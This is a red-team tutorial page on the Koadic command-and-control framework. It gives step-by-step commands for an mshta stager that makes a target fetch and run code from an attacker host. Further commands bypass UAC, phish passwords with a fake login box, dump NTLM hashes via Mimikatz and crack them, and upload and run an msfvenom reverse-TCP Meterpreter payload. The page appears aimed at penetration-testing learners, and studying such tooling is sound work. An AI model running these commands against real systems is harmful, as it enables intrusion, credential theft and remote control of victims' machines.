<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/" rel="category tag">Command and Control</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Koadic – COM Command &amp; Control Framework</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/koadic-com-command-control-framework/" rel="bookmark"><time class="entry-date published" datetime="2019-01-16T15:32:55+00:00">January 16, 2019</time><time class="updated" datetime="2025-05-13T11:27:33+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! In this article, we are introducing another most interesting tool “KOADIC – COM Command &amp; Control” tool which is quite similar to Metasploit and Powershell Empire. So let’s began with its tutorial and check its functionality.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction to Koadic</span></strong></li>
<li><strong><span style="color: #000000;">Installation of Koadic</span></strong></li>
<li><strong><span style="color: #000000;">Usage of Koaidc</span></strong></li>
<li><strong><span style="color: #000000;">Koadic Stagers</span></strong></li>
<li><strong><span style="color: #000000;">Privilege Escalation with Koadic Implants</span></strong></li>
<li><span style="color: #000000;">Post Exploitation</span>
<ul>
<li><span style="color: #000000;">Generate Fake Login Prompt</span></li>
<li><span style="color: #000000;">Enable Rdesktop</span></li>
<li><span style="color: #000000;">Inject Mimikatz</span></li>
<li><span style="color: #000000;">Execute Command</span></li>
<li><span style="color: #000000;">Obtain Meterpreter Session from Zombie Session</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Introduction to Koadic</span></h3>
<p><span style="color: #000000;">Koadic, or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. The major difference is that Koadic does most of its operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in the core to support a default installation of Windows 2000 with no service packs (and potentially even versions of NT4) all the way through Windows 10.</span></p>
<p><span style="color: #000000;">It is possible to serve payloads completely in memory from stage 0 to beyond, as well as use cryptographically secure communications over SSL and TLS (depending on what the victim OS has enabled).</span></p>
<p><span style="color: #000000;">Koadic also attempts to be compatible with both Python 2 and Python 3. However, as Python 2 will be going out the door in the not-too-distant future, we recommend using Python 3 for the best experience.</span></p>
<p><span style="color: #000000;"><em><strong>Source</strong> – <strong>//github.com/zerosum0x0/koadic</strong></em></span></p>
<h3><span style="color: #800000;">Installation of Koadic</span></h3>
<p><span style="color: #000000;">It must first be downloaded and installed in order to start using Koadic. Run the following command to download Koadic from github and also take care of its dependency tools while installing koadic.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/zerosum0x0/koadic.git
cd koadic
apt-get install python3-pip
pip3 install -r requirements.txt
./koadic</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-bjAlpze9ESg/XD9FoYHShWI/AAAAAAAAcGQ/BRKMFOVva10g_V3P8kgXje-5uO4p-GA9wCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;">Usage of Koaidc</span></h3>
<p><span style="color: #000000;">This tool majorly depends upon stager and implant. It contains 6 stager and 41 implants.</span></p>
<p><span style="color: #000000;"><strong>Stager:</strong> Stagers hook target zombies and allow you to use implants.</span></p>
<p><span style="color: #000000;"><strong>Implants:</strong> Implants start jobs on zombies.</span></p>
<p><span style="color: #000000;">Once installation gets completed, you can run <strong>./koadic</strong> file to start koadic. Then run the most helpful command to get the synopsis of the use of koadic. The help command summarizes the various commands available. Koadic functions are similar to other frameworks, such as Metasploit.</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-tcLJ2SfJL2I/XD9Fq3a_hSI/AAAAAAAAcG0/h7Unh0ZQA5UlKVJexpeG2KuYex06ubcGQCLcBGAs/s1600/2.png" alt="Koadic COM Command and Control Framework" width="638" height="891"/></span></p>
<p><span style="color: #000000;">To load all available module in the terminal run “<strong><em>use &lt;tab&gt; &lt;tab&gt;”</em></strong> command. This will dump all available implant and stagers for execution or explore stager module with following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use stager/js/</pre>
<p><span style="color: #000000;">This will give you all stagers that will be useful for getting zombie session of the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-oaNfUQl-DFM/XD9FrYRVQvI/AAAAAAAAcG4/wl31WXzMYhoK_uYCC4qa8vMU5sZDYB9WACLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Koadic Stagers</span></h3>
<p><span style="color: #000000;">The stager enables us to describe where any zombie device accesses the Koadic command and control. Some of these settings can be viewed by running info command once the module is selected. Let’s start with loading the <strong>mshta stager</strong> by running the following command.</span></p>
<p><span style="color: #000000;">Set SRVHOST where the stager should call home and SRVPORT the port to listen for stagers on or even you can set ENDPOINT for the malicious file name and then enter run to execute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set SRVHOST 192.168.1.107
set ENDPOINT sales
run</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-bM2mHEBZTMI/XD9FrnvgNJI/AAAAAAAAcG8/wOhp_lQV-aon6X6n4JX5QqaoP5WHZ0qyACLcBGAs/s1600/4.png" alt="Koadic COM Command and Control Framework" width="769" height="376"/></span></p>
<p><span style="color: #000000;"> Now run below command to execute the above generated malicious file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta //192.168.1.107:9999/sales</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-uwUX9P0H3gw/XD9Fr0lBPsI/AAAAAAAAcHA/ySeULZCj2t4Viat4DBvzFhrsAIluw_jYACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Once the malicious sales file will get executed on the target machine, you will have a <strong>Zombie connection</strong> just like metasploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zombies 0</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//1.bp.blogspot.com/-EL0cu7Srrt8/XD9FsInmKPI/AAAAAAAAcHE/Yhod21obhwIkEXeLtlTUMltWsKKP_ckGQCLcBGAs/s1600/6.png" alt="Koadic COM Command and Control Framework" width="822" height="451"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation with Koadic Implants</span></h3>
<p><span style="color: #000000;">Once you have zombie session after than you can use implant modules for privilege escalation that includes bypass UAC.</span></p>
<p><span style="color: #000000;">Koadic contains all modules to bypass UAC of Windows 7, 8, 10 platform so that you can extract system level information. We can load this module by running the command below within Koadic.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/elevate/bypassuac_eventvwr</pre>
<p><span style="color: #000000;">Then, we will set the payload value to run the module. You can use default zombie value as “ALL” to attack all zombies or can set the particular zombie id you want to attack. Use the command below to adjust the payload value and zombie.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set PAYLOAD 0
set ZOMBIE 0
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-3uuMHOodKk0/XD9FssApLBI/AAAAAAAAcHI/NpOvATCydeIy3_0b84jcPddT-D76A88xgCLcBGAs/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Post Exploitation</span></h3>
<h4><span style="color: #000000;">Generate Fake Login Prompt</span></h4>
<p><span style="color: #000000;">You can start a phishing attack with koadic and track the victim’s login credentials. We can load this module by running the command below within Koadic.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/phish/password_box
set ZOMBIE 1
run</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-CT7l6zJyNOM/XD9Fs26uQ8I/AAAAAAAAcHQ/xfMOe6IdFz0bCOXx5DJ9yxvuyEp1F-NpgCLcBGAs/s1600/8.png" alt="Koadic COM Command and Control Framework" width="647" height="223"/></span></p>
<p><span style="color: #000000;">This will launch a Prompt screen for login at the victim’s machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-91QVn8sd4BA/XD9Fs5u8cBI/AAAAAAAAcHM/lW2FvhOYWf0VX3qRNWcRQOwjso1wd7U2gCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Therefore, if the victim enters his password in a fake prompt, you get the password in the command and control shell of Koadic.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-D-yusrDbS9o/XD9FoRboCvI/AAAAAAAAcGU/m3FsqqGHRa8m3f2udotuYtolQKVMQaVpwCLcBGAs/s1600/10.png" alt="Koadic COM Command and Control Framework" width="578" height="59"/></span></p>
<h4><span style="color: #000000;">Enable Rdesktop</span></h4>
<p><span style="color: #000000;">Just like metasploit, here also you can enable remote desktop service in the victim’s machine with the following implant module.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/manage/enable_rdesktop
set ZOMBIE 1
run</pre>
<p><span style="color: #000000;">As you can observe in the below image that job 4 is completed successfully and it has enabled rdesktop service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-PhLRIIhPQ_A/XD9FoRaKkWI/AAAAAAAAcGM/UtD6H8QGA5QqX6wAP_lKMqrtmeXeddFggCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We can ensure for rdesktop service with the help of nmap to identify state for port 3389.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p3389 192.168.1.103</pre>
<p><span style="color: #000000;">Hmm!! So you can observe from nmap result we found port 3389 is open which means <strong>rdesktop</strong> service is enabled.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-gds6RBQavBQ/XD9Fo33HUCI/AAAAAAAAcGY/sm0LPZwMhRQsdn4RyygamJagNX9L-tlrgCLcBGAs/s1600/12.png" alt="Koadic COM Command and Control Framework" width="625" height="186"/></span></p>
<h4><span style="color: #000000;">Inject Mimikatz</span></h4>
<p><span style="color: #000000;">It will let you inject mimikatz in victim’s machine for extracting the password from inside the machine. We can load this module by running the command below within Koadic.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/inject/mimikatz_dotnet2js
set ZOMBIE 1
run</pre>
<p><span style="color: #000000;">As result, it will dump the <strong>NTLM hash</strong> password which we need to crack. Save the NTLM value in a text file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-xqtm2sGcKuw/XD9FpepQoCI/AAAAAAAAcGg/RtWy8eRhauA1IJIgjQe9OvYLWBgNmzevACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Then we will use john the ripper for cracking hash value, therefore run following command along with the hash file as shown below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john hash --format=NT</pre>
<p><span style="color: #000000;">As you can observe that it has shown 123 as the password extracted from the hash file.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-8smxnKE86g8/XD9FpCFtH6I/AAAAAAAAcGc/sQnP25jOadkzK33YKklT2qg134-nVXV6gCLcBGAs/s1600/14.png" alt="Koadic COM Command and Control Framework" width="816" height="207"/></span></p>
<h4><span style="color: #000000;">Execute Command</span></h4>
<p><span style="color: #000000;">Since we high privileged shell, therefore, we are free to run any implant module for Post exploitation, and now we are using exec_cmd to execute any command on the Windows system. To load this implant, run the command given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/manage/exec_cmd</pre>
<p><span style="color: #000000;">Then, we will set the CMD value to run the specified command along with Zombie id.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set CMD ipconfig
set ZOMBIE 1
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/--T0ZJ-ExcZo/XD9Fp4GSIQI/AAAAAAAAcGk/M7Yxt42mdWInoGndaVu1FYx1Wtoauxa_QCLcBGAs/s1600/15.png"/></span></p>
<h4><span style="color: #000000;">Obtain Meterprter Session from Zombie Session</span></h4>
<p><span style="color: #000000;">If you are having zombie session then you can get meterpreter session through it. Generate a malicious file with the help of msfvenom and start multi handle, as we always do in metasploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f exe &gt; shell.exe</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-tsHMm2C3qd0/XD9FqLVjkZI/AAAAAAAAcGo/W04uIdD_oME45EvG6Lm-pL9lUQb9FbZYQCLcBGAs/s1600/16.png" alt="Koadic COM Command and Control Framework" width="977" height="108"/></span></p>
<p><span style="color: #000000;">Koadic provides an implant module that allows you to upload any file inside the machine of the victim if you have zombie sessions. To load this implant, run the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/util/upload_file</pre>
<p><span style="color: #000000;">Now set the file location and Zombie Id then run the module. This will upload your malicious in writable directory i.e. %TEMP%.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set LFILE /root/shell.exe
set ZOMBIE 1
run</pre>
<p><span style="color: #000000;">Once the job is completed then again use exec_cmd to run the uploaded file with the help of this module.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use implant/manage/exec_cmd</pre>
<p><span style="color: #000000;">Then, we will set the CMD value to run the uploaded shell.exe file along with Zombie id.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set CMD %TEMP%/shell.exe
set ZOMBIE 1
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-nagdgoSZ50k/XD9FqDjN2-I/AAAAAAAAcGs/p4ktuLKpHXcgTqkx6xA2GpLX_uXgS3GRQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Once you will execute the malicious exe file within Koadic zombie session, you will get a meterpreter session in the metasploit framework as shown below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set rhost IP 192.168.1.107
set lport 1234
exploit</pre>
<p><span style="color: #000000;">Once the file is executed on the machine we will get the victim machine meterpreter session as shown below:</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-tLFPdzUBf10/XD9Fq_eIqeI/AAAAAAAAcGw/okDey8ahhGQQBTx_0kvASTiy7Vk8KEgawCLcBGAs/s1600/18.png" alt="Koadic COM Command and Control Framework" width="727" height="403"/></span></p>
<p><span style="color: #000000;">To learn more about <strong>Command and Control</strong>. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
